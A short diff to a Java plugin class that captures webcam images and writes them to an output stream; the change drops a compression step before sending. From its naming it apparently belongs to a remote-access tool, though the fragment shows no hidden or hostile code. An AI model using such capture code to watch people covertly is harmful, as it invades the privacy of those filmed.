@@ -50,7 +50,7 @@ public class Plugin extends StubPlugin {
 					
 					BufferedImage image = cam.getImage();
 
-					byte[] buffer = Utils.compress(Utils.encodeImage(image, 1F));
+					byte[] buffer = Utils.encodeImage(image, 1F);
 
 					dos.writeInt(buffer.length);
 					dos.write(buffer);
